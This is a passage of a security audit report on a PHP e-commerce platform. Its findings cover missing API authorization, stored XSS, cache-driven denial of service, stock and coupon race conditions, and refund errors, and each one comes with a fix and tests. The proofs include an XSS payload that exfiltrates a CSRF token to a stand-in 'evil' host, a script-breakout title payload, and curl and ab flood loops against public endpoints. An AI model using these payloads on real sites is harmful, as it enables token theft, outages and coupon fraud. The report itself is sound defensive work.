`RATE_LIMITED` is already in `ApiResponse::STATUS` → 429, the same status the throttle filter returns, so mobile clients already handle it. Both repository methods are try/catch-wrapped and fail open on DB error, so this cannot break login.

**Regression Risk:** Low — two visible changes on the failure path only: a user who genuinely mistypes 5× in 15 minutes now sees 429 instead of 401 (identical to today's web behaviour); and the counter is shared with the web login, so an attacker can lock a known identifier out of both surfaces for 15 minutes. That DoS already exists on the web login and is the accepted trade-off there — raise `MAX_FAILS` rather than dropping the check if it matters for mobile.

**Testing:** *Works:* `curl -X POST .../api/v1/auth/login -d '{"identifier":"<valid>","password":"<valid>"}'` returns the same `{success,data:{token,token_type,expires_in,user}}` envelope and the token still authenticates `GET /api/v1/customer/profile`. *Closed:* 5 wrong passwords → 6th returns 429 `RATE_LIMITED`; 6 rows in `login_attempts`; the same identifier is also locked on the web form; a different identifier is unaffected.

---

#### H3 — `api/v1` has authentication but no authorization: `perm` and `tenantScope` are applied to zero routes

**Severity:** High

**Location:** `app/Config/Filters.php:37-40` (aliases declared and documented, never used); `app/Config/Routes.php:845-1052`; `app/Controllers/Api/V1/VendorApiController.php:1067` (`settlements`), `:1084` (`settlement`), `:1424` (`commissionLedger`), `:1053` (`gstSummary`), `:1386` (`staffList`), `:1120`/`:1449` (transfers).

**Description:** `PermissionFilter` and `TenantScopeFilter` are fully implemented, tested and aliased, and `Filters.php:37` even documents the intended usage. `grep -c "perm:" app/Config/Routes.php` → **0**. `grep -c "tenantScope"` → **0**. And `grep -rn "policyEngine\|->can(" app/Controllers/Api/` returns **zero hits** — not one api/v1 controller performs an RBAC check. The entire seeded permission catalogue (`pos.sell`, `pos.price.override`, `settlement.view`, `inventory.adjust`, `rider.manage`, `order.cancel`) is granted to roles and never enforced on the mobile surface. Grant-without-enforcement.

`JwtAuthFilter` authenticates the token, re-checks account status, sets `ScopeContext` — and ignores its `$arguments` entirely.

The concrete, currently-exploitable consequence is an **intra-tenant vertical escalation**. `VendorApiController::vendorId()` (`:323-331`) resolves staff to the vendor id "for parity with the web panel". `shopScope()`/`inShopScope()` exist and are applied to orders (`:203`), deliveries and inventory — but **not** to the financial and staff endpoints, which check only `$vid === null`. `staffList()` is even documented "Owner only" with no owner check. So a `vendor_pos_cashier` — confined to one shop on the web — gets `GET /vendor/settlements`, `/vendor/settlements/{id}`, `/vendor/commission`, `/vendor/gst`, `/vendor/staff`, and `POST /vendor/transfers` + `/vendor/transfers/{id}/{action}`: the vendor's complete financial position and stock-transfer control. Entry is `POST /api/v1/auth/login` (see H2).

**Proof:**
```php
// app/Config/Filters.php:37-40 — declared, documented, never applied
// Auth/access spine (Phase 6) — apply per-route, e.g. ['filter' => ['jwtAuth', 'perm:order.view.own']]
'perm'        => \App\Filters\PermissionFilter::class,
'tenantScope' => \App\Filters\TenantScopeFilter::class,

// app/Controllers/Api/V1/VendorApiController.php:1067 — no shop scope, no permission
public function settlements()
{
    $vid = $this->vendorId();
    if ($vid === null) { return $this->notVendor(); }
```

**Fix:** Two changes, both additive and behaviour-preserving for legitimate clients.

1. **Close the leak now, in the controller,** using the `isOwner()` predicate the class already uses for `createStaff`/`updateStaff`/`updateBusinessProfile` (`:1419`):
```php
// Vendor-wide money is owner-only, exactly as on the web panel where a shop-scoped
// staffer never sees a sibling branch's figures.
if (! $this->isOwner()) {
    return $this->failWith('FORBIDDEN', 'Only the vendor owner can view settlements.');
}
```
Apply to `settlements()`, `settlement()`, `commissionLedger()`, `gstSummary()`, `staffList()`, `transfers()`, `createTransfer()`, `transferAction()`.

2. **Start wiring the filter that exists**, on new/edited routes first so nothing shipped breaks:
```php
$routes->post('vendor/transfers', 'Api\\V1\\VendorApiController::createTransfer',
    ['filter' => ['jwtAuth', 'perm:inventory.transfer']]);
```
Roll out one route group at a time behind the project's log-only convention — the seeded role→permission map has never been exercised against live traffic.

**Regression Risk:** Medium — part 1 is the risky half. If the shipped vendor app shows Settlements / Commission / GST / Staff tabs to non-owner staff today, those screens start returning 403. That is the intended security change but it is a visible product change. Confirm with the app team whether those tabs are already hidden for staff logins; if not, ship together with an app-side hide, or return `$this->collection([], ['total' => 0])` for the *list* endpoints so screens render empty rather than erroring. Part 2 carries the classic `perm:` risk: a role missing the named code loses the endpoint — do **not** retrofit onto existing mobile routes in one commit.

**Testing:** *Works:* as a vendor **owner** on the app, exercise every `/api/v1/vendor/*` screen — all unchanged. As a branch manager, orders/inventory/deliveries still return only their shop's rows. *Closed:* obtain a JWT for a `vendor_pos_cashier` via `/api/v1/auth/login`; `GET /vendor/settlements`, `/vendor/settlements/1`, `/vendor/commission`, `/vendor/gst`, `/vendor/staff` must all return the FORBIDDEN envelope; `GET /vendor/orders` must still return only that shop's orders. Add a shrink-only test alongside `AdminGuardScopeTest` asserting every `api/v1/vendor` route either carries `perm:` or calls `isOwner()`/`inShopScope()`.

---

#### H4 — The cross-panel principal pin is log-only by default, so no route group enforces which panel a session belongs to

**Severity:** High *(the enabling layer for C2; also the blocker for the staged rollout)*

**Location:** `app/Filters/WebAuthFilter.php:74-106`, specifically `:85` and `:99-101`. Pinned groups: `Routes.php:171` (admin), `:573` (vendor), `:784` (manufacturer).

**Description:** `before()` proves only that *some* session is logged in. The panel argument (`webAuth:platform`, `webAuth:vendor`, `webAuth:manufacturer`) is evaluated in `checkPrincipal()`, but the enforcement block sits behind `filter_var(env('auth.enforcePrincipalType', false), FILTER_VALIDATE_BOOLEAN)` and returns `null` when false — the redirect at `:103-105` is unreachable. There is no `.env` in the tree, the tracked `env` template has no `auth.*` key, and `tests/unit/Common/PrincipalTypeGateTest.php:56-79` codifies log-only as the deliberate current state. So today: a vendor session is accepted on every `/admin/*` route, a manufacturer session on every `/vendor/*` route, and so on. All three groups are path-based with no subdomain option, so the domain-wide cookie is not even required.

The filter's own docblock states the consequence and names the 34 mis-scoped guards.

*Caveat, stated honestly:* the production server's `.env` could not be read from here, so it is possible the flag is set true on the live host. The tracked default, the absent `.env`, the test that pins log-only, and four separate code comments (`Routes.php:170`, `Routes.php:782`, `BaseManufacturerController.php:25`, `ManufacturerPanelIsolationTest.php:16`) all point one way. **Verify with one grep on the server before assuming C2 is live.**

**Proof:**
```php
// app/Filters/WebAuthFilter.php:85-101
$enforcing = filter_var(env('auth.enforcePrincipalType', false), FILTER_VALIDATE_BOOLEAN);
log_message($enforcing ? 'warning' : 'notice', sprintf('principal-type mismatch [%s]: …'));
if (! $enforcing) { return null; }
```

**Fix:** Do **not** flip the flag as the primary fix — fix the guards (C2) first, because flipping today breaks the impersonation exit (M16). Two steps:

1. **Now, low risk:** close the lanes that can never be legitimate, regardless of the flag. Inside `checkPrincipal()`, after the `$actual === $expected` early return:
```php
// Principals that can never legitimately hold a staff-panel session. Only
// Auth\LoginController::attempt() can produce one (it does not gate principal_type),
// and no route grants a customer or rider any back-office capability — so blocking
// these cannot lock out real staff.
if ($actual === 'customer' || $actual === 'rider') {
    log_message('warning', sprintf('principal-type mismatch [BLOCKED]: user %d is "%s" but %s requires "%s".',
        $userId, $actual, $request->getUri()->getPath(), $expected));
    return redirect()->to('login')->with('error', 'That area is not available for this account.');
}
```
2. **After** (a) the admin guards carry `isPlatform()`, (b) `admin/portal/leave` is moved out of the pinned group, and (c) a full traffic day of `writable/logs` shows only genuine cross-panel attempts, flip the default:
```php
// Phase 3 of the rollout: the pin now defaults ON. Set auth.enforcePrincipalType=false
// in .env to roll back without a deploy.
$enforcing = filter_var(env('auth.enforcePrincipalType', true), FILTER_VALIDATE_BOOLEAN);
```
Do **not** narrow `Config\Cookie::$domain` — the panels are cross-subdomain by design and a host-scoped cookie would break impersonation and log everyone out.

**Regression Risk:** Step 1 Low (customers/riders hold no roles; every page they can reach already refuses them at the permission check). Step 2 **Medium** — any account whose `users.principal_type` is mislabelled relative to the panel its owner uses daily gets redirected to that principal's landing page and is effectively locked out of their normal work. That is exactly why the log-only phase exists. Rollback is env-only, no deploy.

**Testing:** *Works (enforcement on, staging):* platform → `/admin/*`; vendor owner and branch manager → `/vendor/*`; manufacturer → `/manufacturer/*`; rider → `/rider/*`; customer → `/store/account`. Then admin → vendor portal → Return to admin → `/admin/dashboard`. *Closed:* give a rider account a password, sign in at `/login`, request `/admin/dashboard` — must redirect. With the flag on, a vendor session requesting `/admin/settlements` must redirect to `vendor/dashboard` and the log must read `[BLOCKED]`. Before flipping in production: `grep 'principal-type mismatch' writable/logs/log-*` for a full day and confirm every hit is genuine cross-panel access.

---

#### H5 — Stored XSS on the public storefront product page (two sinks), reachable by any vendor with no approval gate

**Severity:** High

**Location:** `app/Views/store/product.php:38` (used `:153`, `:168`) and `app/Views/store/product.php:18` — rendered by `Store\StoreController::product()`.

**Description:** Two independent injection points in the same public view, both fed by raw vendor-controlled text.

**Sink A — `strip_tags()` keeps attributes.** `$rich = strip_tags($html, '<p><br><ul><ol><li><strong><em><b><i><h4><h5><h6>')` is the only sanitiser applied to five vendor rich-text fields before they are echoed unescaped. PHP's `strip_tags()` removes disallowed *tags*; it does **not** remove attributes from allowed ones. `<p onmouseover=…>`, `<b onfocus=… tabindex=0>` survive intact. Verified: `php -r "echo strip_tags('<p onmouseover=\"alert(1)\">x</p>','<p>');"` → `<p onmouseover="alert(1)">x</p>`. The fields are stored raw — `AdminProductRepository::saveContent()` (`:704-726`) writes `full_description`, `ingredients`, `usage_instructions`, `safety_instructions`, `storage_instructions`, `additional_info` verbatim, and `Vendor\ProductController::productInput()` (`:407-420`) does `array_merge((array) $this->request->getPost(), …)`.

**Sink B — JSON-LD without `JSON_HEX_TAG`.** `json_encode($ld, JSON_UNESCAPED_SLASHES)` disables exactly the `/` → `\/` escaping that normally makes `</script>` impossible from inside a JSON string, and no `JSON_HEX_TAG` replaces it. `$ld['name']` is the raw `$product['title']`. Verified: `php -r "echo json_encode(['n'=>'a</script>b'], JSON_UNESCAPED_SLASHES);"` → `{"n":"a</script>b"}`. The same file one directory away already does this right (`app/Views/partials/_product_form_body.php:328` uses `JSON_HEX_TAG`).

**Exploitability is higher than a first read suggests.** The obvious `update()` path is blocked on published products and reverts them to draft — but `Vendor\ProductController::autosaveSection()` (`:254-268`, route `Routes.php:626`) checks only vendor ownership with no status check, and `AdminProductRepository::autosave()` case `'content'` calls `saveContent()` directly. **A vendor can rewrite a LIVE published product's content with no approval gate.** For sink B, `POST /api/v1/vendor/products` (`VendorApiController::createProduct`, `:773`) trims the title with no character filtering and honours a caller-supplied `status: 'published'` directly; schema defaults (`visibility='public'`, `is_online_enabled=1`) make it immediately storefront-visible.

No compensating control: `ContentSecurityPolicy.php:41` is `$reportOnly = true`, the global `secureheaders` filter sets no CSP, and `.htaccess:81` sets only `frame-ancestors 'self'`.

*Correction to note:* `document.cookie` theft **fails** — `Config\Cookie.php:66` sets `$httponly = true`. What does work is CSRF-token theft: `app/Views/layouts/store.php:19-20` publishes `csrf-name`/`csrf-hash` meta tags, and `Security.php` has `tokenRandomize=false, regenerate=false`, so the stolen token is a stable per-session secret that drives any state-changing route as the victim.

**Proof:**
```php
// app/Views/store/product.php:38, 18
$rich = static fn ($html) => strip_tags((string) $html, '<p><br><ul><ol><li><strong><em><b><i><h4><h5><h6>');
<script type="application/ld+json"><?= json_encode($ld, JSON_UNESCAPED_SLASHES) ?></script>
```
Attack A: autosave `full_description = <p onmouseover="fetch('//evil/?t='+document.querySelector('meta[name=csrf-hash]').content)">Ingredients</p>` on a live product. Every visitor who hovers the description fires it.
Attack B: `POST /api/v1/vendor/products` with `title = Widget</script><img src=x onerror=…>` and `status=published`. The `<head>` closes the script element and the rest is parsed as HTML.

**Fix:** Two lines, both preserving every currently-rendered byte.
```php
// Sink A — app/Views/store/product.php:38
// strip_tags() removes disallowed TAGS but keeps ATTRIBUTES on the tags it allows
// (PHP docs), so <p onmouseover=…> survives it. Safe to regex: after strip_tags()
// the only tags present are the ones listed.
$rich = static function ($html): string {
    $safe = strip_tags((string) $html, '<p><br><ul><ol><li><strong><em><b><i><h4><h5><h6>');
    return (string) preg_replace('#<\s*(/?)\s*(p|br|ul|ol|li|strong|em|b|i|h4|h5|h6)\b[^>]*>#i', '<$1$2>', $safe);
};

// Sink B — app/Views/store/product.php:18
// JSON_HEX_TAG is load-bearing: JSON_UNESCAPED_SLASHES turns off the default \/
// escaping, so without it a product title containing </script> closes this element.
<script type="application/ld+json"><?= json_encode($ld, JSON_UNESCAPED_SLASHES | JSON_HEX_TAG) ?></script>
```

**Regression Risk:** Low — Sink A renders identically for all Quill output using plain `<p>/<strong>/<em>/<ul>/<ol>/<li>/<h4>-<h6>`; the one visible change is that Quill's `class="ql-indent-1"` on nested `<li>` is dropped, so a manually indented sub-list flattens to a normal bullet (no text or tag lost). `<a>`, `<img>`, `<span>`, `<table>` are already removed today. Sink B changes only the byte encoding of `<`/`>` inside the JSON payload; every conformant JSON-LD parser (including Google's) decodes them back, so structured data is semantically unchanged.

**Testing:** *Works:* open a product with a formatted description — Product-details and More-info tabs must render the same paragraphs, bold/italic, headings and bullets (diff the rendered HTML). Paste the `application/ld+json` block into Google's Rich Results Test — must still validate as a Product with the same name/price/brand. *Closed:* save `full_description = <p onmouseover="alert(1)">hover</p><b onfocus=alert(2) tabindex=0>x</b>` — view source must show `<p>hover</p><b>x</b>`. Repeat for the other five content fields. Set a title to `Test</script><img src=x onerror=alert(1)>` — it must appear hex-escaped inside the script element, which must still close at its own `</script>`, with no alert.

---

#### H6 — Anonymous request with an arbitrary `?category=` forces a synchronous full-catalogue aggregation and permanently grows a cache table

**Severity:** High

**Location:** `app/Libraries/Store/FacetCache.php:69` (`coldFallback`), `:264-279` (`refreshBrowse`); `app/Models/StoreCatalogRepository.php:197-213`, `:257-271`; entry point `app/Controllers/Api/V1/CustomerApiController.php:97`, route `app/Config/Routes.php:874`.

**Description:** The FacetCache key is built directly from the caller's `category` option, which on the public `/api/v1/customer/products` endpoint is raw, unvalidated query-string input. `_noOtherFilters()` uses `empty()` and the controller passes integer `0` for `in_stock`/`on_offer`, so it returns true; with no lat/lng there is no `shop_ids` key so `_cacheableScope()` returns true; `countProducts()` therefore calls `facetCache->browse($opts)`. A never-seen key makes `read()` return null and `coldFallback()` run `refreshBrowse()` **inline on the request**: four full-catalogue aggregations (`computeCount`, `computeBrandFacets`, `computeTypeFacets`, `computePriceBounds`), then `store()`s a permanent row into `category_facet_summary` (UNIQUE on `scope_key, category_slug`).

Because `applyFilters()` silently ignores an unresolvable slug, the aggregation runs over the **entire** published catalogue (~960K products per the code's own comments) — while `$hint` is still `FORCE INDEX (idx_products_cat_status_del)` because `! empty($opts['category'])` is true, pinning the optimizer to a category index with no category predicate. The worst possible plan.

There is also **no single-flight lock on this path**: `refresh()` (the worker entry) takes `facetlock_…`; `coldFallback()`/`refreshFor()` do not. N concurrent requests with the same novel slug all compute simultaneously.

The route has no auth filter and no throttle (`Filters.php:130-134` applies only `cors` to `api/*`).

*One sub-claim corrected:* `store()` deletes the queue row for the key it just computed, so the plain `?category=` vector does **not** leave worker jobs behind. The `lat`/`lng` vector does — `GeoBucket::keyFor()` snaps to 2 decimals (~648M distinct `scope_key` values), `coldFallback()` enqueues under the bucket scope but `store()` only ever runs for `'global'`, so those `facet_refresh_queue` rows survive and the worker later re-aggregates each one.

**Proof:**
```php
// app/Libraries/Store/FacetCache.php:69-78 — inline, unlocked, on the request
private function coldFallback(string $scope, string $cat): array
{
    $this->enqueue($scope, $cat, 'cold');
    if ($scope !== 'global') { return $this->read('global', $cat) ?? $this->refreshFor('global', $cat); }
    return $this->refreshFor('global', $cat);
}
```
Attack: `for i in $(seq 1 5000); do curl "https://…/api/v1/customer/products?category=x$i"; done` — 4 × ~960K-row aggregations per request, single-connection DB saturation within seconds, plus 5,000 permanent `category_facet_summary` rows. The `lat`/`lng` variant additionally grows `facet_refresh_queue` without bound.

**Fix:** Canonicalise the slug **before** it becomes a cache key. An unresolvable slug already produces full-catalogue results, so collapsing it to `''` returns byte-identical data while pinning the key to the pre-warmed entry.
```php
// app/Models/StoreCatalogRepository.php
/** @var array<string,bool> per-request memo: slug => exists */
private array $catSlugMemo = [];

/**
 * Collapse an unresolvable category slug to '' before it becomes a FacetCache key.
 * applyFilters() already ignores an unknown slug, so the result set is unchanged —
 * but the cache key stops being caller-controlled.
 */
private function _canonicalOpts(array $opts): array
{
    $slug = (string) ($opts['category'] ?? '');
    if ($slug === '') { return $opts; }
    if (! array_key_exists($slug, $this->catSlugMemo)) {
        $this->catSlugMemo[$slug] = Database::connect()->table('categories')
            ->where('slug', $slug)->where('deleted_at', null)->countAllResults() > 0;
    }
    if (! $this->catSlugMemo[$slug]) { $opts['category'] = ''; }
    return $opts;
}
```
Add `$opts = $this->_canonicalOpts($opts);` as the first line of `countProducts()`, `brandFacets()`, `typeFacets()`, `priceBounds()`, `categoryFacets()`, `categoryTreeWithCounts()`. Then give the cold path the same single-flight lock the worker has:
```php
private function refreshFor(string $scope, string $cat): array
{
    $lock = 'facetlock_' . $scope . '_' . md5($cat);
    if (cache($lock) !== null) {
        // Another request/worker owns this key — serve the durable base rather than
        // recomputing the same ~960K-row aggregate in parallel.
        return $this->loadSummary($scope, $cat) ?? ['tree'=>[], 'total'=>0, 'brandFacets'=>[],
            'typeFacets'=>[], 'priceBounds'=>['lo'=>0.0,'hi'=>0.0], 'computed_at'=>0];
    }
    cache()->save($lock, 1, 120);
    try { return $cat === self::TREE_CAT ? $this->refreshTree($scope) : $this->refreshBrowse($scope, $cat); }
    finally { cache()->delete($lock); }
}
```
And add the throttle filter to the public browse routes: `['filter' => 'throttle:120,60']` on `customer/products` and `customer/home`.

**Regression Risk:** Medium — the canonicalisation is behaviour-preserving by construction and adds one memoised 168-row lookup. The single-flight change means a concurrent cold request serves the durable base instead of an exact fresh computation (zeros for one request if the base is also missing). **The throttle is the real risk:** a chatty mobile client legitimately exceeding 120 browse calls/minute would get 429s — verify against real access logs, and remember `App::$proxyIPs` is `[]`, so if a CDN sits in front, every request shares one bucket. Ship log-only first per the project convention.

**Testing:** *Works:* `?category=fruits-vegetables` returns the same items/total; `?category=` and `?category=nonexistent` both return the full-catalogue total, identical to today. Web browse and `php spark facets:refresh` produce identical payloads. *Closed:* `SELECT COUNT(*) FROM category_facet_summary` before/after 200 random-slug requests — must not increase. `SHOW FULL PROCESSLIST` during the loop must show no repeated `FORCE INDEX` aggregates.

---

#### H7 — Storefront checkout oversells: the stock check runs outside the transaction with no row lock

**Severity:** High

**Location:** `app/Models/StoreOrderRepository.php:36-50` (check), `:54` (`transBegin`), `:162-166` (decrement).

**Description:** `place()` validates availability in a loop **before** `transBegin()`, using a plain `SELECT SUM(available)` that takes no locks under InnoDB's default REPEATABLE READ. It then decrements with `GREATEST(on_hand - qty, 0)`, which can never fail and never reports that it clamped. Two — or twenty — concurrent checkouts for the last unit all read the same `avail`, all pass, all enter their own transactions and all decrement. `on_hand` bottoms out at 0 and every order is confirmed: `status='confirmed'`, invoice and sub-order created, vendor told to fulfil goods that do not exist. There is no `SELECT … FOR UPDATE` anywhere in `app/`. `database/sql/04_transaction.sql:310` confirms `available` is a STORED generated column with no CHECK.

The comment on the decrement claims "no oversell" — `GREATEST(…, 0)` prevents a *negative balance*, not an oversell.

The web path is partially protected against the *same* user racing (PHP session locking plus the one-time `checkout_token` at `CheckoutController.php:428-433`), but that does nothing for the cross-customer race, and the API path (`Routes.php:879`, jwtAuth only) has no session, no checkout token, and only an **optional** `idempotency_key` the attacker simply omits.

A secondary hole: the guard is `$avail > 0 && $avail < $qty`, so `avail === 0` skips it entirely. Both live callers catch that via `qtyError()`, so it is defence-in-depth rather than an independent exploit — but `place()` is documented as the backstop "for EVERY caller".

**Proof:**
```php
// app/Models/StoreOrderRepository.php:42-54
$avail = (float) ($db->table('inventory i')->selectSum('i.available','avail')
    ->join('shops s','s.id = i.shop_id','left')
    ->where('i.variant_id',$vid)->where('s.vendor_id',(int)$it['vendor_id'])
    ->where('s.deleted_at',null)->get()->getRowArray()['avail'] ?? 0);
if ($avail > 0 && $avail < $qty) { return null; }
…
$db->transBegin();          // ← the check happened up here, unlocked
```
Attack: two parallel `POST /api/v1/customer/orders` for the last unit. Both 201. N parallel requests oversell by N-1.

**Fix:** Move the check inside the transaction and take row locks, keeping the exact accept/reject condition so no currently-accepted order becomes rejected in the uncontended case.
```php
$db->transBegin();
try {
    // Backstop validation for EVERY caller (web checkout + mobile API). This runs
    // INSIDE the transaction and takes row locks: read-check-write on stock without
    // a lock lets two concurrent checkouts for the last unit both pass.
    $catalog = service('storeCatalogRepository');
    foreach ($items as $it) {
        $vid = (int) $it['variant_id']; $qty = (float) $it['qty'];
        if (! PurchaseRules::validate($qty, $catalog->purchaseRulesForVariant($vid))['ok']) {
            $db->transRollback(); return null;
        }
        $avail = (float) ($db->query(
            'SELECT COALESCE(SUM(i.available),0) AS avail FROM inventory i
               LEFT JOIN shops s ON s.id = i.shop_id
              WHERE i.variant_id = ? AND s.vendor_id = ? AND s.deleted_at IS NULL
              FOR UPDATE', [$vid, (int) $it['vendor_id']])->getRowArray()['avail'] ?? 0);
        if ($avail > 0 && $avail < $qty) { $db->transRollback(); return null; }
    }
```
To avoid deadlocks between two multi-line carts, sort lines by variant id immediately after the empty-cart guard: `usort($items, static fn ($a,$b) => ((int)$a['variant_id']) <=> ((int)$b['variant_id']));` — `$items` order is not otherwise significant (`$seq` is a counter and the cart is documented single-vertical).

**Regression Risk:** Medium — `FOR UPDATE` holds row locks on `inventory` for the placement transaction, which now includes the per-item sub_order/order_item inserts. Under heavy same-variant concurrency this converts silent overselling into serialised waits and, worst case, lock-wait timeouts surfacing as the existing `return null` → "could not place order, please retry". Reordering `$items` changes the `sub_order_no` suffix ordering for multi-item carts — cosmetic, but confirm no report or test asserts a specific item→suffix mapping. The `$avail > 0` zero-stock hole is deliberately left as-is here so no currently-accepted order starts failing.

**Testing:** *Works:* place single-item and multi-item orders via `/store/checkout` and `POST /api/v1/customer/orders`; order_no, sub_orders, order_items, payments and totals byte-identical. *Closed:* set a variant to `on_hand=1`, fire 10 parallel API orders (`xargs -P10`) — exactly one 201, `on_hand` = 0, exactly one `order_items` row. Deadlock check: parallel two-item carts with variants in opposite order — no `Deadlock found` in the log.

---

#### H8 — Coupon usage and per-user limits are bypassable by concurrent checkouts

**Severity:** High

**Location:** `app/Models/StoreCouponRepository.php:44-46` (global check), `:59-65` (per-user check); `app/Models/StoreOrderRepository.php:90-102` (the unconditional increment). Schema: `database/sql/04_transaction.sql:1107-1122`.

**Description:** Coupon limits are enforced by reading `coupons.used_count` and counting `coupon_redemptions` in `validate()`, then — in a separate request phase — incrementing `used_count` **unconditionally** in `place()`. Nothing locks the coupon row between the two, the UPDATE carries no `used_count < usage_limit` predicate, and `coupon_redemptions` has **no UNIQUE key** on `(coupon_id, customer_id)` — only three plain KEYs. Both limits fall to concurrency:

- **Global `usage_limit`:** N concurrent checkouts by N different customers all read `used_count = limit - 1`, all validate, all place. A 100-redemption launch coupon redeems thousands of times.
- **`per_user_limit`:** the same customer fires N concurrent `POST /api/v1/customer/orders`; `countAllResults()` returns the same pre-race value for all of them. The JWT API path holds no session and its `idempotency_key` is optional and attacker-chosen, so nothing serialises it.

Directly monetisable — the discount is written into `orders.discount_total`/`grand_total` before the redemption row is recorded, so every racing order is genuinely discounted.

**Proof:**
```php
// app/Models/StoreOrderRepository.php:90-102 — no predicate, no lock
$db->table('coupon_redemptions')->insert([…]);
$db->table('coupons')->where('id', (int) $cp['id'])->set('used_count', 'used_count + 1', false)->update();
```
Attack: `LAUNCH100` with `usage_limit = 1`. Fire 20 concurrent API orders from 20 customer JWTs. All 20 return 201 with the discount applied; `used_count` reads 20 against a limit of 1.

**Fix:** Make the increment the enforcement point — a conditional UPDATE inside the existing placement transaction, plus a locked re-count for the per-user limit. Both rely on the row lock the UPDATE itself takes; no new locking primitive.
```php
if ($coupon !== null && $coupon !== '') {
    $cp = $db->table('coupons')->select('id, per_user_limit')
        ->where('code', strtoupper($coupon))->where('deleted_at', null)->get()->getRowArray();
    if ($cp !== null) {
        $couponId = (int) $cp['id'];

        // The UPDATE carries the limit predicate so it is the enforcement point, not
        // validate(): two concurrent checkouts both read the same used_count, but only
        // one can satisfy `used_count < usage_limit` under the row lock.
        $db->table('coupons')->where('id', $couponId)
            ->groupStart()->where('usage_limit', null)
                ->orWhere('used_count < usage_limit', null, false)->groupEnd()
            ->set('used_count', 'used_count + 1', false)->update();

        if ($db->affectedRows() !== 1) { $db->transRollback(); return null; }

        $lim = $cp['per_user_limit'] !== null ? (int) $cp['per_user_limit'] : 0;
        if ($lim > 0) {
            $used = $db->table('coupon_redemptions')
                ->where('coupon_id', $couponId)->where('customer_id', $customerId)->countAllResults();
            if ($used >= $lim) { $db->transRollback(); return null; }
        }

        $db->table('coupon_redemptions')->insert([
            'coupon_id' => $couponId, 'customer_id' => $customerId, 'order_id' => $orderId,
            'discount_amount' => $this->n((float) ($totals['discount'] ?? 0)), 'redeemed_at' => $now,
        ]);
    }
}
```

**Regression Risk:** Medium — behaviour changes only in the racing/exhausted case, which is the bug. The customer sees a generic retry rather than "coupon exhausted"; surfacing a specific reason means threading it through the `?string` return used by both `CheckoutController` and `CustomerApiController`. Note the mobile API's `placeOrder` re-validates and silently *drops* an invalid coupon (`CustomerApiController.php:266-273`), so under this fix an app order racing to exhaustion fails outright rather than placing un-discounted — decide which you want (dropping `$pct` to 0 and continuing is the alternative).

**Testing:** *Works:* apply a valid coupon on web and app — discount, `used_count` increment and the redemption row unchanged; expired/exhausted coupons show the same messages as today. *Closed:* `usage_limit=1`, 20 parallel API orders → exactly one 201, `used_count` = 1, one redemption row. `per_user_limit=1`, 10 parallel orders from one customer → exactly one succeeds.

---

#### H9 — Public unauthenticated `/api/v1/customer/brands` runs an uncached full-catalogue GROUP BY on every request

**Severity:** High

**Location:** `app/Controllers/Api/V1/CustomerApiController.php:58-65`; `app/Models/StoreCatalogRepository.php:414-424` (`computeBrandFacets`) vs `:403-411` (the cached wrapper `brandFacets`). Route `app/Config/Routes.php:871`.

**Description:** `brands()` calls `computeBrandFacets()` — the method explicitly documented as *"Raw brand facets (UNCACHED)"* — bypassing the `brandFacets()` wrapper that is the only thing consulting FacetCache. With no `category` parameter, `$opts = []`, so `facetBase()` scans the whole published catalogue joined to `categories`, `vendors`, `product_variants` and `brands`, computes `COUNT(DISTINCT p.id)` grouped by brand and sorts by count. The route carries no auth filter and no throttle. A single unauthenticated attacker looping this saturates the database with concurrent full-catalogue aggregations, with no cache layer to absorb it because this entry point skips the one that exists.

*Corrected:* the companion claim about `shopCategories()` is **refuted** — `categoryFacets()` checks `_noOtherFilters` first, so a bare `shop_ids` takes the `categoryTreeWithCounts()` branch, which is join-free, deliberately unpinned for the single-shop case, and scoped to one shop's products. It is uncached per request but far cheaper than described. This finding stands on `brands()` alone.

**Proof:**
```php
// app/Controllers/Api/V1/CustomerApiController.php:64 — the uncached call
return $this->ok(service('storeCatalogRepository')->computeBrandFacets($opts));
```
Attack: `ab -n 500 -c 50 'https://…/api/v1/customer/brands'` — fifty concurrent ~960K-row `GROUP BY DISTINCT` scans, tmp-table/sort thrash, connection pool exhausted, storefront and mobile apps down together.

**Fix:** Route through the cached wrapper that already exists. Identical rows, up to `FacetCache::TTL_FRESH` (90s) stale.
```php
public function brands()
{
    $category = trim((string) $this->request->getGet('category'));
    $opts     = $category !== '' ? ['category' => $category] : [];

    // brandFacets(), not computeBrandFacets(): the wrapper reads the SWR-cached,
    // exact payload for the unfiltered browse and only falls through to the live
    // ~960K-row GROUP BY when a real filter is active. Same data, same shape.
    return $this->ok(service('storeCatalogRepository')->brandFacets($opts));
}
```
Plus `['filter' => 'throttle:60,60']` on `customer/brands` and `customer/shop-categories`.

**Regression Risk:** Low — the cached payload is built by the same `computeBrandFacets()` code at the same default limit of 25, which is what this controller already passes implicitly; verify the app does not expect more than 25 brands. The throttle is the usual risk — check real per-IP rates first (and note `proxyIPs` is empty).

**Testing:** *Works:* `GET /api/v1/customer/brands` and `?category=<real slug>` return the same brand list and counts (diff the JSON). *Closed:* with the general query log on, hit it 20× — at most **one** `SELECT b.id, b.name, COUNT(DISTINCT p.id)` in the 90s window. `ab -n 200 -c 20` should now show flat latency.

---

#### H10 — `RefundService` resolves the wrong sub-order: unbalanced ledger, wrong GST credit note, wrong commission clawback

**Severity:** High

**Location:** `app/Libraries/Payment/RefundService.php:62-73` (resolution), `:102` (factor), `:143` (commission). Reached from `Admin\RefundController::process()` (`:65`), route `app/Config/Routes.php:266`.

**Description:** Every online order creates **one sub-order per product** (`StoreOrderRepository::place()` loops `foreach ($items as $it)` inserting one row per cart line). Returns are raised per sub-order — `submitOrderReturn()` (`:562-573`) inserts one `returns` row with `'sub_order_id' => $subId`, and the column exists at `04_transaction.sql:640`. But `initiateRefund()` (`:605-626`) writes only `payment_id`/`return_id`/`amount`/`kind`, so the sub-order identity is discarded at refund creation and is recoverable **only** via `returns.sub_order_id` — which `complete()` never reads.

Instead it re-derives the sub-order by joining `sub_orders so ON so.order_id = o.id` and taking `orderBy('so.id','ASC')` — the **first** sub-order of the whole order, whichever product that happens to be. Three things follow on any multi-product order:

1. `$factor = refundAmount / firstSubOrder.grand_total`, clamped to 1.0 by `factor()`. Refunding a ₹5,000 product against a ₹200 first sub-order gives factor 1.0.
2. The double-entry debits SALES + GST_PAYABLE using the **first** sub-order's taxable/tax values but credits CASH/CUST_WALLET with the **real** refund amount. Debits and credits stop balancing — visible on `admin/ledger/trial-balance`.
3. The `credit_notes` row is stamped with the wrong `sub_order_id` and under-reversed GST — a **filed GST document that is wrong**.

